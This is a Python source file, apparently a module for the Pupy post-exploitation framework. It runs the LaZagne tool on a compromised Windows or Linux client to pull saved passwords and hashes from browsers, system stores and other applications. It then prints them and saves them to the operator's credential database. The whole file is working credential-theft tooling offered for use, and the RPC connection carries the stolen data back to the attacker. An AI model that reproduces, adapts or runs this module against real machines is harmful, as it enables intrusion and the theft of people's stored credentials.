# -*- coding: utf-8 -*-
# Author: AlessandroZ

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
from pupylib.utils.credentials import Credentials
import tempfile
import subprocess
import os.path
import sys
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="LaZagne"

@config(cat="creds")
class LaZagne(PupyModule):
    """
        execute LaZagne (Windows / Linux)
    """

    dependencies = {
        'all': [ 'sqlite3', '_sqlite3', 'xml', '_elementtree',
                     'calendar', 'xml', 'xml.etree', 'lazagne', 'colorama' ],
        'windows': [ 'win32crypt', 'win32api', 'win32con', 'win32cred',
                         'impacket', 'win32security', 'win32net', 'pyexpat' ],
        'linux': [ 'dbus', 'secretstorage', 'crypt' ]
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="lazagne", description=self.__doc__)
        self.arg_parser.add_argument("-v", "--verbose", action='store_true')

    def run(self, args):
        if self.client.is_windows():
            self.client.load_dll('sqlite3.dll')

        db = Credentials()
        passwordsFound = False
        moduleNames = self.client.conn.modules["lazagne.config.manageModules"].get_modules()
        for module in moduleNames:
            if args.verbose:
                self.info("running module %s"%(str(module).split(' ',1)[0].strip('<')))
            passwords = module.run(module.options['dest'].capitalize())
            passwordsFound = True
            self.print_results(module.options['dest'].capitalize(), passwords, db)

        if not passwordsFound:
            self.warning("no passwords found !")

    def print_results(self, module, creds, db):
        if creds:
            print "\n############## %s passwords ##############\n" % module
            clean_creds = []
            for cred in creds:
                clean_cred = {}
                clean_cred['Category'] = '%s' % module
                clean_cred['uid']=self.client.short_name()
                for c in cred.keys():
                    credvalue = cred[c]
                    if not type(credvalue) in (unicode, str):
                        credvalue = str(credvalue)
                    else:
                        credvalue = credvalue.strip().decode('utf-8')

                    clean_cred[c] = credvalue
                    print u'%s: %s' % (c, clean_cred[c])
                    if c == "Password":
                        clean_cred['CredType'] = 'plaintext'
                    elif c == 'Hash':
                        clean_cred['CredType'] = 'hash'
                print
                # manage when no password found
                if 'CredType' not in clean_cred:
                    clean_cred['CredType'] = 'empty'
                clean_creds.append(clean_cred)

            try:
                db.add(clean_creds)
                self.success("Passwords stored on the database")
            except Exception, e:
                print e
